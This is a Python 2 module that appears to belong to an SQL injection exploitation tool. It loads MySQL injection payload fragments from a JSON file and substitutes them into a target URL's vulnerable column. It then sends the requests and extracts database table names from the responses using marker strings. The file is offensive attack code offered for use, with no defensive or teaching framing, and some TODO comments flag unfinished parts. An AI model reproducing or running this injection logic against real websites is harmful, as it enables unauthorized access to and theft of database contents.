try:
    import requests
    import json
    import re
    from time import sleep

    from Config.WebConfig import define_headerdata
except Exception as error:
    raise SystemExit, "we have problem with importing the libraries: %s" % error


class GetTableDB:
    def __init__(self, url=None, vulnerableColumns=None):
        self.url = url
        self.vulnerableColumns = vulnerableColumns[0]

    def getAllTable(self):
        # todo => have problem here
        with open('./WebAttack/sqlinjection/modules/exploit/classicmethods/mysql/staticpaloads/getTables.json') \
                as file:

            data_extracted = list()
            payloads = json.load(file)

            for startItem in payloads['payloads']['mainPhrase']:

                for endItem in payloads['payloads']['lastPhrase']:

                    # todo =>  fix here
                    response = requests.get(

                        url=self.url.replace(self.vulnerableColumns, startItem) + " " +
                        endItem.replace("COUNTER", str(1)) + " %23",

                        headers=define_headerdata, verify=False
                    )

                    print (self.url.replace(self.vulnerableColumns, startItem) + " " +
                           endItem.replace("COUNTER", str(1)) + " %23")

                    if response.content.find("'2134115356'") is not -1:
                        end = re.search("'2134115356'", response.content).end()
                        start = re.search("'62134115356'", response.content).start()
                        data_extracted.append(response.content[end:start])
                        break
                    # here

                if len(data_extracted) != 0:
                    break

                sleep(1)

            print data_extracted

            return data_extracted


def getTables(url=None, vulnerableColumns=None):
    getTable = GetTableDB(url=url, vulnerableColumns=vulnerableColumns)

    print getTable.getAllTable()

    return getTable
